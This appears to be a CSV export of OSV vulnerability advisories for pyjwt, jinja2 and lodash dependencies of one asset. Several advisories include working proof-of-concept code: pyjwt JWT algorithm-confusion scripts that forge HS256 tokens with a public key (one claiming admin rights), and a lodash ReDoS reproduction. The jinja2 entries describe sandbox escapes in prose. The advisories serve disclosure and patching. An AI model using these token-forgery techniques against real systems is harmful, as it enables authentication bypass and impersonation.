asset_id,component_name,version,ecosystem,source,vulnerability_id,cve_ids,summary,details,modified,published,aliases
ASSET-001,pyjwt,1.7.1,PyPI,OSV,GHSA-ffqj-6fqr-9h24,['CVE-2022-29217'],Key confusion through non-blocklisted public key formats,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Disclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).

> PyJWT supports multiple different JWT signing algorithms. With JWT, an 
> attacker submitting the JWT token can choose the used signing algorithm.
> 
> The PyJWT library requires that the application chooses what algorithms 
> are supported. The application can specify 
> ""jwt.algorithms.get_default_algorithms()"" to get support for all 
> algorithms. They can also specify a single one of them (which is the 
> usual use case if calling jwt.decode directly. However, if calling 
> jwt.decode in a helper function, all algorithms might be enabled.)
> 
> For example, if the user chooses ""none"" algorithm and the JWT checker 
> supports that, there will be no signature checking. This is a common 
> security issue with some JWT implementations.
> 
> PyJWT combats this by requiring that the if the ""none"" algorithm is 
> used, the key has to be empty. As the key is given by the application 
> running the checker, attacker cannot force ""none"" cipher to be used.
> 
> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is 
> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used 
> if the key begins with ""ssh-rsa"". If HMAC is used with a public key, the 
> attacker can just use the publicly known public key to sign the token 
> and the checker would use the same key to verify.
> 
>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. 
> With ed25519, PyJWT supports public keys that start with ""ssh-"", for 
> example ""ssh-ed25519"".

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

# Generate ed25519 private key
private_key = ed25519.Ed25519PrivateKey.generate()

# Get private key bytes as they would be stored in a file
priv_key_bytes = 
private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, 
encryption_algorithm=serialization.NoEncryption())

# Get public key bytes as they would be stored in a file
pub_key_bytes = 
private_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)

# Making a good jwt token that should work by signing it with the 
private key
encoded_good = jwt.encode({""test"": 1234}, priv_key_bytes, algorithm=""EdDSA"")

# Using HMAC with the public key to trick the receiver to think that the 
public key is a HMAC secret
encoded_bad = jwt.encode({""test"": 1234}, pub_key_bytes, algorithm=""HS256"")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
     print(""POC Successfull"")

# Of course the receiver should specify ed25519 algorithm to be used if 
they specify ed25519 public key. However, if other algorithms are used, 
the POC does not work
# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py
#
#        invalid_strings = [
#            b""-----BEGIN PUBLIC KEY-----"",
#            b""-----BEGIN CERTIFICATE-----"",
#            b""-----BEGIN RSA PUBLIC KEY-----"",
#            b""ssh-rsa"",
#        ]
#
# However, OKPAlgorithm (ed25519) accepts the following in 
jwt/algorithms.py:
#
#                if ""-----BEGIN PUBLIC"" in str_key:
#                    return load_pem_public_key(key)
#                if ""-----BEGIN PRIVATE"" in str_key:
#                    return load_pem_private_key(key, password=None)
#                if str_key[0:4] == ""ssh-"":
#                    return load_ssh_public_key(key)
#
# These should most likely made to match each other to prevent this behavior
```


```python
import jwt

#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem
#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem
#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub

priv_key_bytes = b""""""-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49
AwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk
Ak3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END EC PRIVATE KEY-----""""""

pub_key_bytes = b""""""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL
Zr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END PUBLIC KEY-----""""""

ssh_key_bytes = b""""""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc=""""""

# Making a good jwt token that should work by signing it with the private key
encoded_good = jwt.encode({""test"": 1234}, priv_key_bytes, algorithm=""ES256"")

# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret
encoded_bad = jwt.encode({""test"": 1234}, ssh_key_bytes, algorithm=""HS256"")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
    print(""POC Successfull"")
else:
    print(""POC Failed"")
```

> The issue is not that big as 
> algorithms=jwt.algorithms.get_default_algorithms() has to be used. 
> However, with quick googling, this seems to be used in some cases at 
> least in some minor projects.

### Patches

Users should upgrade to v2.4.0.

### Workarounds

Always be explicit with the algorithms that are accepted and expected when decoding.

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in https://github.com/jpadilla/pyjwt
* Email José Padilla: pyjwt at jpadilla dot com
",2024-10-15T16:27:42.751871Z,2022-05-24T22:17:27Z,"['CVE-2022-29217', 'PYSEC-2022-202']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,GHSA-fhv5-28vv-h8m8,['CVE-2026-48524'],PyJWKClient unbounded JWKS endpoint requests via attacker-controlled kid values (DoS),"> [!NOTE]
>  The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. Impact is reduced auth availability until the next successful fetch, not complete denial of service.

## Summary
PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests.

Additionally, fetch_data() finally block clears the JWKS cache on network error.

## Root Cause
jwt/jwks_client.py:172-198 - get_signing_key(kid) calls get_signing_keys(refresh=True) for unknown kids, bypassing TTL cache with no cooldown.
jwt/jwks_client.py:120-122 - finally block writes None to cache on error, clearing valid data.

## Impact
- DoS against JWKS endpoint (unlimited requests per invalid token)
- DoS against application (network I/O latency)
- Cascading failure (rate limiting clears cache, breaking legitimate auth)

## Suggested Fix
1. Add refresh cooldown (refuse refresh more than once per TTL period)
2. Move cache write from finally to else block

## Affected Versions
All versions with PyJWKClient (2.4.0 through 2.12.1)",2026-06-16T15:44:20.804330301Z,2026-06-15T17:28:46Z,"['CVE-2026-48524', 'PYSEC-2026-177']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,GHSA-xgmm-8j9v-c9wx,['CVE-2026-48526'],PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed,"> [!NOTE]
> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.

### Summary
When the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   

### Details
In JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.
In pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:
  
`jws.decode(token, key=rsa_jwk_json, algorithms=[""HS256"",""RS256""])) `

An attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. 
The attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. 

If we look on current protections implemented in the library, at class HMACAlgorithm:

```
  def prepare_key(self, key: str | bytes) -> bytes:
        key_bytes = force_bytes(key)

        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):
            raise InvalidKeyError(
                ""The specified key is an asymmetric key or x509 certificate and""
                "" should not be used as an HMAC secret.""
            )

        return key_bytes
```
We can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.

In The following example:
`jws.decode(token, key=rsa_jwk_json, algorithms=[""HS256"",""RS256""])) `
There is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. 

The bypass happens only if the verifier:
 (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.

### PoC
Please run the code and observe the payload printed in clear text({""sub"":""alice"",""admin"":true}')

```
from jwt.api_jws import PyJWS
import json, base64, hmac, hashlib

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b""="")

# Public RSA JWK (public by design)
rsa_jwk_json = json.dumps({""kty"":""RSA"",""n"":""AQAB"",""e"":""AQAB""})

# Attacker-crafted token: flip to HS256 and choose claims
header  = b64u(b'{""alg"":""HS256"",""typ"":""JWT""}')
payload = b64u(b'{""sub"":""alice"",""admin"":true}')
signing = header + b""."" + payload

# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”
sig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()
token = (signing + b""."" + b64u(sig)).decode()

# Vulnerable verifier: mixed families + JWK JSON string as key
jws = PyJWS()
print(jws.decode(token, key=rsa_jwk_json, algorithms=[""HS256"",""RS256""]))
# -> b'{""sub"":""alice"",""admin"":true}'
```


### Impact
Unauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).",2026-06-16T15:44:21.766942950Z,2026-06-15T19:28:06Z,"['CVE-2026-48526', 'PYSEC-2026-179']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2022-202,['CVE-2022-29217'],,"PyJWT is a Python implementation of RFC 7519. PyJWT supports multiple different JWT signing algorithms. With JWT, an attacker submitting the JWT token can choose the used signing algorithm. The PyJWT library requires that the application chooses what algorithms are supported. The application can specify `jwt.algorithms.get_default_algorithms()` to get support for all algorithms, or specify a single algorithm. The issue is not that big as `algorithms=jwt.algorithms.get_default_algorithms()` has to be used. Users should upgrade to v2.4.0 to receive a patch for this issue. As a workaround, always be explicit with the algorithms that are accepted and expected when decoding.",2023-11-08T04:09:10.999573Z,2022-05-24T15:15:00Z,"['CVE-2022-29217', 'GHSA-ffqj-6fqr-9h24']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2025-183,['CVE-2025-45768'],,"pyjwt v2.10.1 was discovered to contain weak encryption. NOTE: this is disputed by the Supplier because the key length is chosen by the application that uses the library (admittedly, library users may benefit from a minimum value and a mechanism for opting in to strict enforcement).",2026-05-21T15:00:28.178881228Z,2025-07-31T21:15:27.320Z,['CVE-2025-45768']
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2026-120,['CVE-2026-32597'],,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.",2026-05-20T09:19:15.426301Z,2026-03-13T19:55:09.500Z,"['CVE-2026-32597', 'GHSA-752w-5fwx-jx9f']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2026-175,['CVE-2026-48522'],,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained ""plant a JWKS to forge tokens"" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.",2026-06-02T12:15:09.282275410Z,2026-05-28T16:16:29.150Z,"['CVE-2026-48522', 'GHSA-993g-76c3-p5m4']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2026-177,['CVE-2026-48524'],,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.",2026-06-02T12:15:10.363704191Z,2026-05-28T16:16:29.403Z,"['CVE-2026-48524', 'GHSA-fhv5-28vv-h8m8']"
ASSET-001,pyjwt,1.7.1,PyPI,OSV,PYSEC-2026-179,['CVE-2026-48526'],,"PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, when the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm. This vulnerability is fixed in 2.13.0.",2026-06-02T12:15:10.840770477Z,2026-05-28T16:16:29.657Z,"['CVE-2026-48526', 'GHSA-xgmm-8j9v-c9wx']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,GHSA-cpwx-vrp4-4pq7,['CVE-2025-27516'],Jinja2 vulnerable to sandbox breakout through attr filter selecting format method,"An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.",2026-07-07T17:56:16.836141266Z,2025-03-05T20:40:14Z,"['CVE-2025-27516', 'PYSEC-2026-1471']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,GHSA-h5c8-rqwp-cp95,['CVE-2024-22195'],Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter,"The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",2026-07-07T17:56:26.824570957Z,2024-01-11T15:20:48Z,"['CVE-2024-22195', 'PYSEC-2026-1473']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,GHSA-h75v-3vvj-5mfj,['CVE-2024-34064'],Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter,"The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.

Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",2026-07-07T17:57:30.872296178Z,2024-05-06T14:20:59Z,"['CVE-2024-34064', 'PYSEC-2026-1474']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,GHSA-q2x7-8rv6-6q7h,['CVE-2024-56326'],Jinja has a sandbox breakout through indirect reference to format method,"An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",2026-07-07T17:56:44.376174317Z,2024-12-23T17:56:08Z,"['CVE-2024-56326', 'PYSEC-2026-1475']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,PYSEC-2026-1471,['CVE-2025-27516'],Jinja2 vulnerable to sandbox breakout through attr filter selecting format method,"An oversight in how the Jinja sandboxed environment interacts with the `|attr` filter allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to use the `|attr` filter to get a reference to a string's plain format method, bypassing the sandbox. After the fix, the `|attr` filter no longer bypasses the environment's attribute lookup.",2026-07-07T17:46:43.358335981Z,2026-07-07T14:34:50.446969Z,"['CVE-2025-27516', 'GHSA-cpwx-vrp4-4pq7']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,PYSEC-2026-1473,['CVE-2024-22195'],Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter,"The `xmlattr` filter in affected versions of Jinja accepts keys containing spaces. XML/HTML attributes cannot contain spaces, as each would then be interpreted as a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. Note that accepting keys as user input is not common or a particularly intended use case of the `xmlattr` filter, and an application doing so should already be verifying what keys are provided regardless of this fix.",2026-07-07T17:46:13.853151947Z,2026-07-07T11:45:29.949639Z,"['CVE-2024-22195', 'GHSA-h5c8-rqwp-cp95']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,PYSEC-2026-1474,['CVE-2024-34064'],Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter,"The `xmlattr` filter in affected versions of Jinja accepts keys containing non-attribute characters. XML/HTML attributes cannot contain spaces, `/`, `>`, or `=`, as each would then be interpreted as starting a separate attribute. If an application accepts keys (as opposed to only values) as user input, and renders these in pages that other users see as well, an attacker could use this to inject other attributes and perform XSS. The fix for the previous GHSA-h5c8-rqwp-cp95 CVE-2024-22195 only addressed spaces but not other characters.

Accepting keys as user input is now explicitly considered an unintended use case of the `xmlattr` filter, and code that does so without otherwise validating the input should be flagged as insecure, regardless of Jinja version. Accepting _values_ as user input continues to be safe.",2026-07-07T17:46:13.832160246Z,2026-07-07T11:45:41.875280Z,"['CVE-2024-34064', 'GHSA-h75v-3vvj-5mfj']"
ASSET-001,jinja2,2.11.3,PyPI,OSV,PYSEC-2026-1475,['CVE-2024-56326'],Jinja has a sandbox breakout through indirect reference to format method,"An oversight in how the Jinja sandboxed environment detects calls to `str.format` allows an attacker that controls the content of a template to execute arbitrary Python code.

To exploit the vulnerability, an attacker needs to control the content of a template. Whether that is the case depends on the type of application using Jinja. This vulnerability impacts users of applications which execute untrusted templates.

Jinja's sandbox does catch calls to `str.format` and ensures they don't escape the sandbox. However, it's possible to store a reference to a malicious string's `format` method, then pass that to a filter that calls it. No such filters are built-in to Jinja, but could be present through custom filters in an application. After the fix, such indirect calls are also handled by the sandbox.",2026-07-07T17:46:13.842466429Z,2026-07-07T14:34:47.732576Z,"['CVE-2024-56326', 'GHSA-q2x7-8rv6-6q7h']"
ASSET-001,lodash,4.17.20,npm,OSV,GHSA-29mw-wpgm-hmr9,['CVE-2020-28500'],Regular Expression Denial of Service (ReDoS) in lodash,"All versions of package lodash prior to 4.17.21 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `toNumber`, `trim` and `trimEnd` functions. 

Steps to reproduce (provided by reporter Liyuan Chen):
```js
var lo = require('lodash');

function build_blank(n) {
    var ret = ""1""
    for (var i = 0; i < n; i++) {
        ret += "" ""
    }
    return ret + ""1"";
}
var s = build_blank(50000) var time0 = Date.now();
lo.trim(s) 
var time_cost0 = Date.now() - time0;
console.log(""time_cost0: "" + time_cost0);
var time1 = Date.now();
lo.toNumber(s) var time_cost1 = Date.now() - time1;
console.log(""time_cost1: "" + time_cost1);
var time2 = Date.now();
lo.trimEnd(s);
var time_cost2 = Date.now() - time2;
console.log(""time_cost2: "" + time_cost2);
```",2025-09-29T21:12:31.102523Z,2022-01-06T20:30:46Z,['CVE-2020-28500']
ASSET-001,lodash,4.17.20,npm,OSV,GHSA-35jh-r3h4-6jhm,"['CVE-2021-23337', 'CVE-2026-4800']",Command Injection in lodash,`lodash` versions prior to 4.17.21 are vulnerable to Command Injection via the template function.,2026-07-08T18:29:36.682352320Z,2021-05-06T16:05:51Z,"['CVE-2021-23337', 'CVE-2026-4800', 'GHSA-r5fr-rjxr-66jc']"
ASSET-001,lodash,4.17.20,npm,OSV,GHSA-f23m-r3pf-42rh,"['CVE-2025-13465', 'CVE-2026-2950']",lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`,"### Impact

Lodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.

The issue permits deletion of prototype properties but does not allow overwriting their original behavior.

### Patches

This issue is patched in 4.18.0.

### Workarounds

None. Upgrade to the patched version.",2026-07-08T07:10:26.957853710Z,2026-04-01T23:50:27Z,"['CVE-2025-13465', 'CVE-2026-2950', 'GHSA-xxjr-mmjv-4gpg']"
ASSET-001,lodash,4.17.20,npm,OSV,GHSA-r5fr-rjxr-66jc,"['CVE-2021-23337', 'CVE-2026-4800']",lodash vulnerable to Code Injection via `_.template` imports key names,"### Impact

The fix for [CVE-2021-23337](https://github.com/advisories/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.

When an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.

Additionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.

### Patches

Users should upgrade to version 4.18.0.

The fix applies two changes:
1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)
2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated

### Workarounds

Do not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",2026-07-08T08:11:11.759560102Z,2026-04-01T23:51:12Z,"['CVE-2021-23337', 'CVE-2026-4800', 'GHSA-35jh-r3h4-6jhm']"
ASSET-001,lodash,4.17.20,npm,OSV,GHSA-xxjr-mmjv-4gpg,"['CVE-2025-13465', 'CVE-2026-2950']",Lodash has Prototype Pollution Vulnerability in `_.unset` and `_.omit` functions,"### Impact

Lodash versions 4.0.0 through 4.17.22 are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. An attacker can pass crafted paths which cause Lodash to delete methods from global prototypes. 

The issue permits deletion of properties but does not allow overwriting their original behavior.  

### Patches

This issue is patched on 4.17.23.",2026-07-08T07:10:26.957853710Z,2026-01-21T23:01:22Z,"['CVE-2025-13465', 'CVE-2026-2950', 'GHSA-f23m-r3pf-42rh']"
